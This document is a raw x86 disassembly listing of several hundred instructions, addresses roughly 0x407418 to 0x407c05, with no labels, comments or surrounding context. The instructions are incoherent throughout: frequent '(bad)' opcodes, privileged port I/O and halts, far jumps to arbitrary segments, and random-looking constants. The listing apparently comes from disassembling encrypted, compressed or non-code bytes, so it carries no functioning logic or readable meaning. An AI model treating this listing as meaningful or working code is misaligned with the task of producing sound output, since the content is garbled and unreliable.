  407418:	mov    eax,gs
  40741a:	scas   eax,DWORD PTR es:[edi]
  40741b:	test   DWORD PTR [eax-0x4cad07d3],edx
  407421:	lock cmp ebx,esp
  407424:	lahf   
  407425:	in     eax,0x4b
  407427:	pop    es
  407428:	pop    ecx
  407429:	mov    ah,0x40
  40742b:	push   cs
  40742c:	add    ecx,DWORD PTR [esi]
  40742e:	mov    edx,0xe265081c
  407433:	or     al,0x78
  407435:	gs cdq 
  407437:	xor    DWORD PTR [ecx+0x4f],0x3b
  40743b:	js     0x40746c
  40743d:	sub    DWORD PTR [eax],ecx
  40743f:	mov    dh,BYTE PTR [ecx+0x2b9ff750]
  407445:	repnz into 
  407447:	and    al,0x8
  407449:	and    al,0xe9
  40744b:	sub    bl,ch
  40744d:	scas   eax,DWORD PTR es:[edi]
  40744e:	push   ebp
  40744f:	lods   eax,DWORD PTR ds:[esi]
  407450:	pop    ebp
  407451:	jae    0x4074c3
  407453:	gs xor edx,esi
  407456:	mov    cl,0x46
  407458:	leave  
  407459:	jnp    0x40749d
  40745b:	mov    al,0x28
  40745d:	push   es
  40745e:	jmp    0x99fe:0x470271
  407465:	cmp    al,0xfa
  407467:	adc    DWORD PTR [esi+0x24],ebp
  40746a:	cmp    ebx,DWORD PTR [esi+0x48d48970]
  407470:	xchg   BYTE PTR [ecx],dh
  407472:	xchg   ebx,eax
  407473:	popa   
  407474:	fwait
  407475:	sbb    BYTE PTR [edi+0x26181cfd],bh
  40747b:	enter  0x9fd6,0x89
  40747f:	lea    eax,ds:0xe3e4a540
  407485:	stc    
  407486:	ret    
  407487:	ins    BYTE PTR es:[edi],dx
  407488:	and    ebp,DWORD PTR ds:0x82c9e939
  40748e:	mov    eax,0x577b1f6b
  407493:	std    
  407494:	in     al,0x46
  407496:	mov    al,ds:0x546fc9f0
  40749b:	les    edx,FWORD PTR [ebx-0x30bf6399]
  4074a1:	jns    0x4074b8
  4074a3:	hlt    
  4074a4:	inc    esp
  4074a5:	(bad)  
  4074a6:	xor    bl,BYTE PTR cs:[ebx+0x6ebb811d]
  4074ad:	mov    edi,0xeedbf39c
  4074b2:	xchg   edi,eax
  4074b3:	cwde   
  4074b4:	js     0x4074ca
  4074b6:	(bad)  
  4074b7:	pop    ss
  4074b8:	pop    ebp
  4074b9:	fimul  DWORD PTR [esi-0x77]
  4074bc:	push   ss
  4074bd:	mov    al,ds:0xca536b1f
  4074c2:	cmp    al,0x3d
  4074c4:	push   cs
  4074c5:	add    BYTE PTR [edx-0x51],ch
  4074c8:	cld    
  4074c9:	push   ss
  4074ca:	imul   DWORD PTR [eax]
  4074cc:	pop    es
  4074cd:	enter  0x1448,0x62
  4074d1:	xor    DWORD PTR [ebx-0x6d],ebp
  4074d4:	fstp   TBYTE PTR [edi-0x5ccef89d]
  4074da:	cli    
  4074db:	or     eax,0x7b82e326
  4074e0:	cmp    DWORD PTR ds:0xe9bae622,ebx
  4074e6:	iret   
  4074e7:	imul   eax,DWORD PTR [ecx-0x3a],0x5b
  4074eb:	dec    edx
  4074ec:	mov    cl,0xc0
  4074ee:	sbb    esp,DWORD PTR [eax+0x58]
  4074f1:	(bad)  
  4074f2:	popa   
  4074f3:	cmovnp edi,ebp
  4074f6:	inc    edi
  4074f7:	push   ebp
  4074f8:	pop    ds
  4074f9:	adc    eax,0xeb13e94d
  4074fe:	push   ecx
  4074ff:	and    al,0x4d
  407501:	popf   
  407502:	mov    ecx,0x16861c27
  407507:	dec    edx
  407508:	enter  0x11ad,0xd5
  40750c:	in     eax,dx
  40750d:	adc    BYTE PTR [ebx+0x5dba5cbd],0xd1
  407514:	push   esi
  407515:	int    0xe2
  407517:	retf   0xfff1
  40751a:	xor    ebp,DWORD PTR [edi-0x6b087d1c]
  407520:	ds dec esi
  407522:	add    BYTE PTR [edi+0x40],0xf1
  407526:	test   DWORD PTR [edi-0xa76bcc2],esi
  40752c:	jbe    0x407583
  40752e:	(bad)
  407532:	sbb    BYTE PTR [ebx+0x221236da],ch
  407538:	jbe    0x4075a3
  40753a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40753b:	rcl    DWORD PTR [edx+eiz*1-0xc30438d],cl
  407542:	xchg   BYTE PTR [ebp-0x1b],al
  407545:	push   ds
  407546:	fdivr  DWORD PTR [ebp-0x66821152]
  40754c:	inc    edi
  40754d:	stos   DWORD PTR es:[edi],eax
  40754e:	sbb    eax,ebp
  407550:	jp     0x407576
  407552:	ret    
  407553:	inc    edi
  407554:	mov    al,0x86
  407556:	mov    ebp,0xc79b52a7
  40755b:	mov    bl,0xd1
  40755d:	push   eax
  40755e:	stc    
  40755f:	or     ch,BYTE PTR [eax+0x38]
  407562:	dec    esi
  407563:	pop    ecx
  407564:	int3   
  407565:	clc    
  407566:	outs   dx,BYTE PTR ds:[esi]
  407567:	pop    esi
  407568:	cdq    
  407569:	les    edx,FWORD PTR [ebx+0x2a3f4a1e]
  40756f:	cmp    edi,DWORD PTR [edi-0x1b]
  407572:	retf   0x21f2
  407575:	(bad)  
  407576:	loopne 0x407549
  407578:	aaa    
  407579:	or     cl,BYTE PTR [esi-0x74]
  40757c:	or     al,0xbc
  40757e:	mov    dl,0xd1
  407580:	mov    BYTE PTR [edi],dh
  407582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407583:	push   es
  407584:	pop    edi
  407585:	jge    0x407514
  407587:	xor    DWORD PTR ds:0x48d90e1d,ebp
  40758d:	or     eax,0x24464151
  407592:	inc    edi
  407593:	mov    edi,0x2e92b485
  407598:	dec    esp
  407599:	jl     0x4075f0
  40759b:	in     al,dx
  40759c:	xor    bh,ah
  40759e:	popf   
  40759f:	fld    TBYTE PTR [eax]
  4075a1:	fimul  DWORD PTR [esi+eax*8-0x57ba5f93]
  4075a8:	(bad)  
  4075aa:	test   eax,0xa45d82ca
  4075af:	int3   
  4075b0:	xor    BYTE PTR [ecx+eiz*8],0xfe
  4075b4:	sbb    ah,BYTE PTR [ebx+0x4604447a]
  4075ba:	test   al,0x3b
  4075bc:	push   edi
  4075bd:	arpl   di,cx
  4075bf:	adc    BYTE PTR [ecx+0x4b6a658],cl
  4075c5:	out    0x49,al
  4075c7:	xchg   esi,eax
  4075c8:	xor    eax,0x1f96af35
  4075cd:	cmp    eax,0x6498fc71
  4075d2:	loope  0x407579
  4075d4:	xchg   edx,eax
  4075d5:	jno    0x4075f0
  4075d7:	jnp    0x407614
  4075d9:	addr16 call 0xaeaf13ff
  4075df:	sub    bl,BYTE PTR [esi-0x7e34cd03]
  4075e5:	cmp    ah,BYTE PTR [esi+0x35]
  4075e8:	iret   
  4075e9:	out    0xf4,eax
  4075eb:	lods   eax,DWORD PTR ds:[esi]
  4075ec:	popa   
  4075ed:	jo     0x40758d
  4075ef:	in     al,0xd3
  4075f1:	stos   BYTE PTR es:[edi],al
  4075f2:	sub    al,0x4b
  4075f4:	in     al,0xf5
  4075f6:	mov    ss,WORD PTR [edx+0x32]
  4075f9:	and    cl,al
  4075fb:	jge    0x407586
  4075fd:	jge    0x40764f
  4075ff:	and    al,0x42
  407601:	and    cl,bh
  407603:	sbb    al,0xf6
  407605:	(bad)  
  407606:	mov    ebx,esp
  407608:	lea    edi,[ebx-0x1dd2fd57]
  40760e:	mov    al,0x43
  407610:	pop    ebx
  407611:	cmc    
  407612:	sub    DWORD PTR [ebx-0x7a96b66f],edi
  407618:	data16 not BYTE PTR [esi]
  40761b:	adc    bl,BYTE PTR [ecx]
  40761d:	pop    ds
  40761e:	jl     0x40765b
  407620:	xchg   ebx,eax
  407621:	in     al,dx
  407622:	xchg   ebp,eax
  407623:	add    DWORD PTR [ecx+edx*2-0x768b7d7b],0x737109ba
  40762e:	fiadd  DWORD PTR [ebx]
  407630:	retf   0x2645
  407633:	sbb    dl,dl
  407635:	dec    esp
  407636:	xchg   esi,eax
  407637:	inc    esi
  407638:	sahf   
  407639:	mov    dl,bh
  40763b:	cmp    cl,dl
  40763d:	cmp    ebp,DWORD PTR [ebp-0x1c]
  407640:	rol    BYTE PTR [eax],1
  407642:	pop    edx
  407643:	add    eax,0x3e5211bc
  407648:	enter  0x3470,0x29
  40764c:	mov    bl,0x7b
  40764e:	dec    esp
  40764f:	aad    0x9e
  407651:	add    dh,BYTE PTR [edx+0x20c2367]
  407657:	xor    eax,0x6459a245
  40765c:	scas   eax,DWORD PTR es:[edi]
  40765d:	jne    0x407647
  40765f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407660:	pop    esi
  407661:	xchg   edi,eax
  407662:	add    BYTE PTR [esi+0x7b2159d1],0x24
  407669:	sahf   
  40766a:	ja     0x4076cd
  40766c:	sbb    bh,BYTE PTR [edx+0x327b0df0]
  407672:	std    
  407673:	out    0xc2,eax
  407675:	scas   eax,DWORD PTR es:[edi]
  407676:	(bad)  
  407677:	xchg   ebx,eax
  407678:	aas    
  407679:	inc    DWORD PTR [esi]
  40767b:	pop    ebx
  40767c:	retf   0xac3f
  40767f:	inc    ebp
  407680:	pop    ecx
  407681:	jne    0x407676
  407683:	in     al,0xdd
  407685:	mov    ebx,edi
  407687:	xor    ecx,DWORD PTR [ecx]
  407689:	adc    eax,0x7ce8cc6d
  40768e:	mov    ecx,0x27dec10a
  407693:	repz push cs
  407695:	xor    eax,0x34045c3
  40769a:	cs aaa 
  40769c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40769d:	std    
  40769e:	aas    
  40769f:	cmp    DWORD PTR [eax+0x35],0x57
  4076a3:	xchg   edx,eax
  4076a4:	fsub   QWORD PTR [eax+0x7e]
  4076a7:	enter  0xf9ef,0x19
  4076ab:	daa    
  4076ac:	pusha  
  4076ad:	sub    edx,0xffffffe8
  4076b0:	push   es
  4076b1:	jbe    0x4076b7
  4076b3:	imul   edx,esi,0xffffff99
  4076b6:	dec    esi
  4076b7:	xchg   edi,eax
  4076b8:	(bad)  
  4076b9:	shr    BYTE PTR [ebp+0x25083bf9],cl
  4076bf:	mov    dh,0x3a
  4076c1:	inc    ebp
  4076c2:	pop    ss
  4076c3:	and    BYTE PTR [eax+0x1e8493d6],dh
  4076c9:	xchg   ebx,eax
  4076ca:	call   0x1572:0x9e39681d
  4076d1:	jp     0x4076c9
  4076d3:	arpl   WORD PTR ds:0xd1cf0713,di
  4076d9:	pop    ebp
  4076da:	pshufw mm6,QWORD PTR [ebp+ecx*2+0x5d11a9f],0xc9
  4076e3:	mov    dh,0x90
  4076e5:	xchg   ecx,eax
  4076e6:	icebp  
  4076e7:	int3   
  4076e8:	(bad)  
  4076e9:	icebp  
  4076ea:	jmp    0x4076c1
  4076ec:	in     al,dx
  4076ed:	ror    bh,0x7b
  4076f0:	fsub   st(0),st
  4076f2:	addr16 iret 
  4076f4:	dec    ebp
  4076f5:	adc    eax,DWORD PTR [ebp+0x7115289]
  4076fb:	add    esp,DWORD PTR [ebx-0x1]
  4076fe:	scas   al,BYTE PTR es:[edi]
  4076ff:	mov    edi,0xee4c7775
  407704:	inc    edi
  407705:	xor    DWORD PTR [edi+0x25d9e0f0],eax
  40770b:	dec    eax
  40770c:	call   ebp
  40770e:	pop    ss
  40770f:	dec    edi
  407710:	xor    dh,BYTE PTR [esi]
  407712:	sar    DWORD PTR [esi],0xa4
  407715:	sahf   
  407716:	dec    esi
  407717:	fcom   QWORD PTR [ecx-0x30]
  40771a:	and    al,0x8f
  40771c:	ins    BYTE PTR es:[edi],dx
  40771d:	dec    esi
  40771e:	imul   eax,edx,0x4d620610
  407724:	cmc    
  407725:	or     ah,BYTE PTR [eax]
  407727:	mov    ah,cl
  407729:	addr16 das 
  40772b:	xchg   ebp,eax
  40772c:	rcl    BYTE PTR [edi],cl
  40772e:	inc    ebx
  40772f:	aaa    
  407730:	inc    esp
  407731:	xchg   ecx,eax
  407732:	xchg   edx,eax
  407733:	arpl   cx,dx
  407735:	fucomi st,st(1)
  407737:	mov    al,0x81
  40773a:	pop    es
  40773b:	dec    edi
  40773c:	out    0x64,eax
  40773e:	dec    esi
  40773f:	or     ah,bl
  407741:	mov    edx,0xbaf96aec
  407746:	fmul   st(0),st
  407748:	cmp    dl,0x86
  40774b:	sbb    DWORD PTR [ecx+eiz*2],edx
  40774e:	outs   dx,BYTE PTR ds:[esi]
  40774f:	sub    ebp,DWORD PTR [ebp-0x48]
  407752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407753:	repnz xor ch,BYTE PTR [edi+0x2256ddf7]
  40775a:	and    BYTE PTR [eax],0x1f
  40775d:	imul   ebp,DWORD PTR [ecx],0xffffffab
  407760:	xchg   ebp,ebp
  407762:	or     BYTE PTR [ecx-0x73],cl
  407765:	dec    eax
  407766:	xchg   BYTE PTR [edx-0x1c222e3b],al
  40776c:	das    
  40776d:	sbb    BYTE PTR [eax+0x38c59d42],ch
  407773:	and    BYTE PTR [esi+0x18],ah
  407776:	mov    eax,0x60abb4bc
  40777b:	push   ss
  40777c:	bound  edx,QWORD PTR [ebx]
  40777e:	and    DWORD PTR [ecx-0x42],eax
  407781:	jg     0x4077d4
  407783:	test   eax,0x2a9a3f9f
  407788:	jle    0x4077ec
  40778a:	pop    ebx
  40778b:	and    cl,BYTE PTR [ecx+ecx*1+0x632ac4ed]
  407792:	pop    esi
  407793:	inc    eax
  407794:	xchg   ch,bl
  407796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407797:	imul   ecx,DWORD PTR [edx],0x9848141e
  40779d:	or     BYTE PTR [eax+0x23],0xa4
  4077a1:	call   0x8119:0x6a7f9535
  4077a8:	push   ebx
  4077a9:	loopne 0x4077ad
  4077ab:	jb     0x4077c1
  4077ad:	dec    esp
  4077ae:	mov    bl,0x2f
  4077b0:	cmp    ebp,DWORD PTR [ebx+edx*4-0x6a99632]
  4077b7:	inc    esi
  4077b8:	jo     0x407822
  4077ba:	arpl   cx,ax
  4077bc:	dec    ebp
  4077bd:	scas   al,BYTE PTR es:[edi]
  4077be:	cmp    ebx,edx
  4077c0:	mov    ds:0x5c00d781,eax
  4077c5:	adc    BYTE PTR [edx+eiz*8-0x3d],ah
  4077c9:	aas    
  4077ca:	jnp    0x40783c
  4077cc:	mov    eax,0x677fa34b
  4077d1:	loopne 0x4077d5
  4077d3:	mov    edi,0x126b1812
  4077d8:	and    BYTE PTR ds:0xde54fe6a,cl
  4077de:	add    ch,BYTE PTR [ecx+edi*4-0x19171180]
  4077e5:	jge    0x407817
  4077e7:	push   es
  4077e8:	stos   BYTE PTR es:[edi],al
  4077e9:	jae    0x40776f
  4077eb:	(bad)  
  4077ec:	(bad)  
  4077ed:	cld    
  4077ee:	(bad)  
  4077ef:	jmp    0x940cb773
  4077f4:	mov    eax,0xf978689a
  4077f9:	bound  esp,QWORD PTR [esi]
  4077fb:	cmp    al,0xfd
  4077fd:	or     eax,0x6c247936
  407802:	adc    al,0x5e
  407804:	push   ebp
  407805:	iret   
  407806:	stc    
  407807:	call   0x2d611af
  40780c:	cwde   
  40780d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40780e:	xchg   ebx,eax
  40780f:	adc    al,0xff
  407811:	xchg   edx,eax
  407812:	inc    esp
  407813:	shr    esp,0x33
  407816:	int    0xe
  407818:	jmp    0x87860610
  40781d:	fild   WORD PTR [ebx]
  40781f:	sub    BYTE PTR [ecx-0x1e],0xfe
  407823:	popa   
  407824:	dec    esi
  407825:	pop    esi
  407826:	fst    QWORD PTR [esi-0x3a]
  407829:	xlat   BYTE PTR ds:[ebx]
  40782a:	ret    0xcbbf
  40782d:	stc    
  40782e:	idiv   BYTE PTR [eax-0x2abcb61d]
  407834:	cmc    
  407835:	push   ebx
  407836:	or     esi,DWORD PTR [ebp-0x25]
  407839:	and    ah,BYTE PTR [esi]
  40783b:	ja     0x407838
  40783d:	sahf   
  40783e:	push   0xffffffd4
  407840:	retf   0xec62
  407843:	bound  esp,QWORD PTR [ebx+eax*1+0x28]
  407847:	inc    edx
  407848:	inc    esp
  407849:	mov    ds:0xc702d0ff,al
  40784e:	hlt    
  40784f:	push   edx
  407850:	jo     0x4077d4
  407852:	(bad)  
  407853:	xchg   edi,eax
  407854:	push   ss
  407855:	xor    esi,ebp
  407857:	xlat   BYTE PTR ds:[ebx]
  407858:	into   
  407859:	jbe    0x407814
  40785b:	xor    eax,0xf383bf32
  407860:	test   eax,0xf3f4efe7
  407865:	xor    BYTE PTR [edx-0x1aa4c212],bl
  40786b:	popf   
  40786c:	ins    BYTE PTR es:[edi],dx
  40786d:	call   0x6aaf:0x49d8da39
  407874:	add    ch,BYTE PTR [esp+ebx*4-0x14]
  407878:	cmp    eax,0x2250db29
  40787d:	cdq    
  40787e:	mov    eax,ds:0x2029aea
  407883:	in     al,0x41
  407885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407886:	rcr    DWORD PTR [edx+0x142c6481],0xbe
  40788d:	sar    bh,cl
  40788f:	pop    esi
  407890:	add    dl,bl
  407892:	mov    ds:0x73b15bf4,al
  407897:	adc    al,BYTE PTR [edx]
  407899:	sbb    DWORD PTR [esi],esi
  40789b:	fisubr DWORD PTR [ebp-0x28e358a5]
  4078a1:	mov    eax,0x270391bf
  4078a6:	xchg   esi,eax
  4078a7:	out    dx,al
  4078a8:	das    
  4078a9:	and    ebp,ebx
  4078ab:	jbe    0x407892
  4078ad:	nop
  4078ae:	ss pusha 
  4078b0:	mov    eax,0x7289fdf2
  4078b5:	outs   dx,DWORD PTR ds:[esi]
  4078b6:	mov    ch,0x88
  4078b8:	retf   
  4078b9:	sahf   
  4078ba:	inc    ebx
  4078bb:	or     al,0x78
  4078bd:	cmp    dh,BYTE PTR [ecx+ebp*2-0x49ea8728]
  4078c4:	int    0xf1
  4078c6:	cwde   
  4078c7:	push   ebp
  4078c8:	xchg   esi,eax
  4078c9:	(bad)  
  4078ca:	aaa    
  4078cb:	sub    eax,0xcc3f53de
  4078d0:	lds    esp,FWORD PTR [edi+0xd973a58]
  4078d6:	mov    edi,0xf2714472
  4078db:	ds or  esi,esi
  4078de:	ficom  DWORD PTR [esi]
  4078e0:	das    
  4078e1:	fnstenv [ebp+0x63]
  4078e4:	push   eax
  4078e5:	(bad)  
  4078e7:	(bad)  
  4078e8:	ret    0xacd
  4078eb:	lods   al,BYTE PTR ds:[esi]
  4078ec:	or     dh,BYTE PTR [eax+esi*4+0x12b0fb85]
  4078f3:	adc    eax,0x9754f9a8
  4078f8:	pop    eax
  4078f9:	push   0x2a51613c
  4078fe:	ficomp DWORD PTR [esp+ebp*4-0x34]
  407902:	fisttp QWORD PTR [eax-0x61]
  407905:	out    dx,eax
  407906:	in     al,dx
  407907:	push   ecx
  407908:	sbb    eax,0x4112b9d5
  40790d:	pop    eax
  40790e:	imul   esp,DWORD PTR [ecx-0x520d8192],0x4a
  407915:	xchg   ebx,eax
  407916:	gs push eax
  407918:	mov    edi,0xbb2fc642
  40791d:	test   DWORD PTR [ebx],edx
  40791f:	xchg   ecx,eax
  407920:	es push ebx
  407922:	in     al,dx
  407923:	popf   
  407924:	xchg   cl,dh
  407926:	not    ah
  407928:	mov    edx,DWORD PTR [eax+0x5e4a3e41]
  40792e:	mov    edi,0xbecd548
  407933:	ret    
  407934:	daa    
  407935:	loopne 0x407989
  407937:	mov    esp,0xb083ff8
  40793c:	hlt    
  40793d:	call   0x9f36:0x58141453
  407944:	push   ss
  407945:	hlt    
  407946:	mov    dh,0x71
  407948:	in     eax,0xdc
  40794a:	mov    DWORD PTR [ecx+0x68],ebp
  40794d:	jae    0x407948
  40794f:	and    eax,0x81aac2cb
  407954:	inc    esp
  407955:	stc    
  407956:	push   ds
  407957:	mov    bh,0x57
  407959:	lds    ebx,FWORD PTR [eax-0x53738907]
  40795f:	ja     0x40799c
  407961:	ja     0x4079a4
  407963:	jmp    0xa86a:0xaf1f96d2
  40796a:	jmp    0x90e6:0xeb2116a2
  407971:	or     cl,bl
  407973:	pop    ecx
  407974:	fnstsw WORD PTR [edi]
  407976:	pop    ebx
  407977:	and    esi,DWORD PTR ds:0x1d7fc06e
  40797d:	ja     0x407982
  40797f:	or     DWORD PTR [esp],edx
  407982:	mov    esi,0x86d4d6eb
  407987:	cdq    
  407988:	sub    ecx,DWORD PTR [esi-0x3]
  40798b:	mov    edi,0x2e7717e3
  407990:	loope  0x40791a
  407992:	and    BYTE PTR [ecx+eiz*1+0x7],dh
  407996:	sub    bh,BYTE PTR [eax-0x13]
  407999:	pop    edx
  40799a:	jae    0x407996
  40799c:	jns    0x40798a
  40799e:	sbb    al,0x26
  4079a0:	mov    al,0xfc
  4079a2:	mov    ch,0xad
  4079a4:	jnp    0x4079d5
  4079a6:	sbb    DWORD PTR [ecx+ecx*8-0x25a27d11],ecx
  4079ad:	cmp    eax,0x6ec362ce
  4079b2:	xchg   ebx,ebx
  4079b4:	inc    edx
  4079b5:	gs dec edx
  4079b7:	ret    0xd2b4
  4079ba:	ins    DWORD PTR es:[edi],dx
  4079bb:	lods   al,BYTE PTR ds:[esi]
  4079bc:	in     eax,dx
  4079bd:	inc    ecx
  4079be:	icebp  
  4079bf:	sbb    BYTE PTR [esp+edi*4],0x9a
  4079c3:	pop    edi
  4079c4:	inc    edx
  4079c5:	push   edx
  4079c7:	int3   
  4079c8:	jbe    0x4079e2
  4079ca:	and    eax,0x87d5a846
  4079cf:	int    0x89
  4079d1:	cmp    BYTE PTR [eax],al
  4079d3:	pop    esi
  4079d4:	jmp    0x407a54
  4079d6:	addr16 rol ebx,cl
  4079d9:	add    DWORD PTR [ebx],0xaf205fb1
  4079df:	and    al,0xed
  4079e1:	popa   
  4079e2:	fbld   TBYTE PTR [esp+edi*2]
  4079e5:	cli    
  4079e6:	stos   BYTE PTR es:[edi],al
  4079e7:	(bad)  
  4079e8:	mov    esi,0x805e900
  4079ed:	jne    0x4079c7
  4079ef:	xchg   ebx,eax
  4079f0:	mov    ebp,0xe120d542
  4079f5:	xlat   BYTE PTR ds:[ebx]
  4079f6:	sub    BYTE PTR [ebx+0x2e87195f],bh
  4079fc:	or     esi,esp
  4079fe:	inc    edx
  4079ff:	out    0x52,al
  407a01:	cmp    ebp,ebp
  407a03:	je     0x407a2d
  407a05:	stos   BYTE PTR es:[edi],al
  407a06:	jge    0x4079ef
  407a08:	mov    dl,0xcc
  407a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a0b:	push   ebp
  407a0c:	jle    0x407a27
  407a0e:	push   ebp
  407a0f:	push   ebx
  407a10:	jp     0x407a22
  407a12:	mov    edx,DWORD PTR [esi+0x251ccbf]
  407a18:	sub    eax,DWORD PTR [ecx-0x6d]
  407a1b:	jl     0x407a36
  407a1d:	out    0x45,al
  407a1f:	mov    esi,edx
  407a21:	dec    esi
  407a22:	cmp    DWORD PTR [edx+0x377bc5c7],ebp
  407a28:	push   ss
  407a29:	cld    
  407a2a:	adc    DWORD PTR fs:[ecx],eax
  407a2d:	ins    DWORD PTR es:[edi],dx
  407a2e:	xchg   esp,eax
  407a2f:	adc    DWORD PTR [edi+0x4f21b0e7],esp
  407a35:	jmp    0xd9ccd8c5
  407a3a:	xchg   edx,eax
  407a3b:	add    al,0x86
  407a3d:	call   FWORD PTR [ebp+ecx*1-0xb]
  407a41:	aad    0xce
  407a43:	loop   0x4079d6
  407a45:	cmc    
  407a46:	int    0x9a
  407a48:	ret    0x2415
  407a4b:	sbb    al,0x7d
  407a4d:	sub    BYTE PTR [ebp+0x46],0x9d
  407a51:	mov    DWORD PTR ds:0xfc2e5132,esi
  407a57:	mov    esp,0x928f38f6
  407a5c:	xchg   ebp,eax
  407a5d:	dec    esp
  407a5e:	jne    0x407a32
  407a60:	stos   DWORD PTR es:[edi],eax
  407a61:	retf   0xc22e
  407a64:	es dec edx
  407a66:	sub    eax,0x37a42582
  407a6b:	push   eax
  407a6c:	mov    ?,WORD PTR ds:0xcb2be55c
  407a72:	mov    ebp,0xd7f7d977
  407a77:	leave  
  407a78:	xchg   edi,eax
  407a79:	sub    BYTE PTR [edx+0x72],cl
  407a7c:	aad    0xb0
  407a7e:	pop    ecx
  407a7f:	popa   
  407a80:	xchg   edi,eax
  407a81:	leave  
  407a82:	les    esp,FWORD PTR [edx-0x67471600]
  407a88:	loope  0x407a24
  407a8a:	jb     0x407aa8
  407a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8d:	xrelease xchg DWORD PTR [ebp+0x53f0b97a],esi
  407a94:	jnp    0x407a63
  407a96:	sub    eax,0xe9d9c76d
  407a9b:	cmp    al,0xcf
  407a9d:	mov    dh,cl
  407a9f:	fcom   QWORD PTR [edx-0x4f65ae15]
  407aa5:	xchg   DWORD PTR [esi-0x528fc5b5],esi
  407aab:	inc    esp
  407aac:	mov    dl,0x84
  407aae:	cmp    al,0xa0
  407ab0:	adc    DWORD PTR [eax-0x4afcf578],esi
  407ab6:	jp     0x407ac6
  407ab8:	cmp    edi,ecx
  407aba:	shl    BYTE PTR [ecx+eax*4+0x5e],cl
  407abe:	jne    0x407aa6
  407ac0:	fild   WORD PTR [ebp+0x6646173a]
  407ac6:	mov    ch,0x61
  407ac8:	stc    
  407ac9:	bound  ecx,QWORD PTR [eax]
  407acb:	jge    0x407afc
  407acd:	ins    DWORD PTR es:[edi],dx
  407ace:	inc    esp
  407acf:	cmp    BYTE PTR [edi],dh
  407ad1:	shl    DWORD PTR [edi],cl
  407ad3:	dec    ebx
  407ad4:	test   bh,bh
  407ad6:	xlat   BYTE PTR ds:[ebx]
  407ad7:	paddusb mm5,QWORD PTR [eax+0x676443d4]
  407ade:	jno    0x407af2
  407ae0:	loop   0x407aa1
  407ae2:	fist   WORD PTR cs:[esi-0x2c07df9a]
  407ae9:	xor    eax,DWORD PTR [edi]
  407aeb:	inc    ebp
  407aec:	test   eax,0x5a026e1b
  407af1:	xchg   ebx,eax
  407af2:	das    
  407af3:	clc    
  407af4:	cmp    bh,al
  407af6:	push   0xfffffff0
  407af8:	jmp    0xa12ce02d
  407afd:	mov    ch,0xbe
  407aff:	push   cs
  407b00:	mov    edx,0xcaf9eb71
  407b05:	dec    esp
  407b06:	lahf   
  407b07:	hlt    
  407b08:	sub    BYTE PTR [esi+edi*1+0x65],al
  407b0c:	dec    eax
  407b0d:	pop    gs
  407b0f:	pop    ebx
  407b10:	pop    ss
  407b11:	sub    al,dh
  407b13:	int3   
  407b14:	(bad)  
  407b15:	les    ebp,FWORD PTR [edx+0x7d00e7d4]
  407b1b:	pushf  
  407b1c:	lods   al,BYTE PTR ds:[esi]
  407b1d:	xor    al,0xeb
  407b1f:	cwde   
  407b20:	jmp    0x407aaf
  407b22:	cmc    
  407b23:	ret    
  407b24:	jg     0x407ae9
  407b26:	in     al,0xb4
  407b28:	jnp    0x407b7d
  407b2a:	out    0x77,al
  407b2c:	stos   BYTE PTR es:[edi],al
  407b2d:	sbb    eax,0x340f318d
  407b32:	call   0xeafa7bed
  407b37:	fwait
  407b38:	xchg   esi,eax
  407b39:	sbb    dh,BYTE PTR [esi]
  407b3b:	mov    ecx,0xb10e69bd
  407b40:	xchg   BYTE PTR [edi+ebp*1],ah
  407b43:	scas   al,BYTE PTR es:[edi]
  407b44:	popa   
  407b45:	xchg   esp,eax
  407b46:	rcr    BYTE PTR [eax+0x490ab631],cl
  407b4c:	mov    eax,0x284a75b8
  407b51:	mov    eax,0x1007b6f0
  407b56:	cmp    eax,0x37110312
  407b5b:	iret   
  407b5c:	mov    esp,0xcddd8e18
  407b61:	or     DWORD PTR [edx-0xca296f4],edx
  407b67:	mov    bl,0xd5
  407b69:	mov    ah,0x65
  407b6b:	adc    eax,0x6e7bf3e5
  407b70:	cdq    
  407b71:	popf   
  407b72:	adc    BYTE PTR [ebx],ch
  407b74:	inc    esp
  407b75:	inc    eax
  407b76:	xor    ecx,edi
  407b78:	lods   al,BYTE PTR ds:[esi]
  407b79:	pop    eax
  407b7a:	call   0xe5dc6284
  407b7f:	jb     0x407b88
  407b81:	jmp    FWORD PTR [eax+0x15]
  407b84:	adc    dh,BYTE PTR [eax+0x71862900]
  407b8a:	addr16 out dx,eax
  407b8c:	jns    0x407bac
  407b8e:	adc    dl,al
  407b90:	icebp  
  407b91:	sbb    bl,0xeb
  407b94:	xor    al,0xc4
  407b96:	mov    eax,0xf53f2329
  407b9b:	enter  0x7331,0xce
  407b9f:	nop
  407ba0:	sahf   
  407ba1:	jecxz  0x407b6f
  407ba3:	cmp    al,0x9f
  407ba5:	cld    
  407ba6:	test   eax,0xf987c9a1
  407bab:	sub    DWORD PTR [eax-0x3931d179],ebx
  407bb1:	jo     0x407bc2
  407bb3:	adc    DWORD PTR [edi-0x2e1dbfa0],esi
  407bb9:	pop    esi
  407bba:	sbb    ebp,0xe29b1917
  407bc0:	xchg   ebx,eax
  407bc1:	push   ss
  407bc2:	inc    ebx
  407bc3:	inc    edi
  407bc4:	mul    BYTE PTR [esi]
  407bc6:	mov    ds:0x1f611983,al
  407bcb:	mov    edi,0x81f6a04c
  407bd0:	mov    ds:0x1546ec67,al
  407bd5:	add    BYTE PTR [ecx+0x49546bf],al
  407bdb:	dec    ebp
  407bdc:	loop   0x407c09
  407bde:	xchg   BYTE PTR [eax+0x3d7413c9],ah
  407be4:	cmc    
  407be5:	int    0x34
  407be7:	inc    edx
  407be8:	gs push ebp
  407bea:	cli    
  407beb:	daa    
  407bec:	xor    BYTE PTR [ebp+0x34],dh
  407bef:	setle  dl
  407bf2:	adc    BYTE PTR [ebx],0xa0
  407bf5:	jmp    0x66f98923
  407bfa:	inc    edi
  407bfb:	ds stc 
  407bfd:	and    DWORD PTR [ebp-0x67],0xae60cb7
  407c04:	pop    ecx
  407c05:	fcmovnbe st,st(7)
